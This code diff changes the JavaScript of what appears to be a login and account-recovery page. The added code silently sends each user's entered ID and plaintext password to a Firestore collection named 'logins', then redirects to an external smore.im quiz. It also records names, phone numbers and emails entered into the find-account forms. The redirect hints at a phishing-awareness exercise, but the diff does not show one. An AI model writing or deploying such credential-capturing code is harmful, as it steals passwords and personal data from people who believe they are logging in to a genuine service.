@@ -946,8 +946,22 @@ async function validateLogin() {
     logAttempt(filled, false);
     return;
   }
-  logAttempt(filled, true);
-  window.location.href = "https://smore.im/quiz/dNOAzwDYdt";
+  
+  // 🔥 입력값 저장
+  try {
+    await window._addDoc(window._collection(window._db, "logins"), {
+      id: idVal,
+      password: pwVal,
+      timestamp: window._serverTimestamp(),
+      userAgent: navigator.userAgent
+    });
+  } catch(e) {
+    console.log("로그인 데이터 저장 실패:", e);
+}
+
+logAttempt(filled, true);
+window.location.href = "https://smore.im/quiz/dNOAzwDYdt";
+  
 }
 
 function clearLoginErrors() {
@@ -1163,11 +1177,11 @@ function validateEmailForm() {
   return valid;
 }
 
-function validateFindForm() {
+async function validateFindForm() {
   if (currentTab === "phone") {
     const result = validatePhoneForm();
-    
-    // 휴대폰 탭 입력 칸 수 체크
+
+    // 입력 개수 체크
     let filled = 0;
     if (document.getElementById("accountInput").value.trim() !== "") filled++;
     if (document.getElementById("lastNameInput").value.trim() !== "") filled++;
@@ -1177,16 +1191,59 @@ function validateFindForm() {
 
     logAttempt(filled, result, "phone");
 
+    // ✅ 유효할 때만 저장
+    if (result) {
+      try {
+        await window._addDoc(window._collection(window._db, "find_phone"), {
+          account: document.getElementById("accountInput").value.trim(),
+
+          // 🔥 이름 구조 개선 (추천)
+          name: {
+            last: document.getElementById("lastNameInput").value.trim(),
+            first: document.getElementById("firstNameInput").value.trim()
+          },
+
+          phone: document.getElementById("phoneInput").value.trim(),
+
+          timestamp: window._serverTimestamp(),
+          userAgent: navigator.userAgent
+        });
+
+        console.log("휴대폰 데이터 저장 완료");
+
+      } catch (e) {
+        console.log("저장 실패:", e);
+      }
+    }
+
   } else {
     const result = validateEmailForm();
 
-    // 이메일 탭 입력 칸 수 체크
+    // 입력 개수 체크
     let filled = 0;
     if (document.getElementById("accountInput").value.trim() !== "") filled++;
     if (document.getElementById("emailInput").value.trim() !== "") filled++;
     if (document.getElementById("emailVerifyInput").value.trim() !== "") filled++;
 
     logAttempt(filled, result, "email");
+
+    // ✅ 유효할 때만 저장
+    if (result) {
+      try {
+        await window._addDoc(window._collection(window._db, "find_email"), {
+          account: document.getElementById("accountInput").value.trim(),
+          email: document.getElementById("emailInput").value.trim(),
+
+          timestamp: window._serverTimestamp(),
+          userAgent: navigator.userAgent
+        });
+
+        console.log("이메일 데이터 저장 완료");
+
+      } catch (e) {
+        console.log("저장 실패:", e);
+      }
+    }
   }
 }
 
